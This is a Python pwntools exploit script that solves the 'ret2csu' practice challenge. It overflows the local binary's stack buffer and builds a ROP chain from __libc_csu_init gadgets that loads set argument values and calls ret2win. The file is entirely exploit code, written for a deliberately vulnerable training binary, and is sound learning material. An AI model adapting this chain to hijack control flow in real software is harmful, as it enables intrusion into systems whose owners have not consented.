#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./ret2csu
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ret2csu')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b _init
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'
gotRet2win=exe.got['ret2win']
pad=b"A"*cyclic_find(0x6161616b)
rop=ROP(exe)
rop.raw(0x000000000040069a) # pop rbx, rbp, r12, r13, r14, r15
rop.raw(0) # rbx
rop.raw(1) # rbp
rop.raw(0x600e38) # r12 dereference to _fini() or _init()
rop.raw(0xdeadbeefdeadbeef) # r13
rop.raw(0xcafebabecafebabe) # r14
rop.raw(0xd00df00dd00df00d) # r15
rop.raw(0x0000000000400680) # mov rdx,r15; rsi,r14; edi,r13d; call QWORD PTR [r12+rbx*8]
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(0x00000000004006a3) # pop rdi;ret;
rop.raw(0xdeadbeefdeadbeef)
rop.raw(exe.symbols['ret2win'])



io = start()
io.sendline(pad+rop.chain())

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

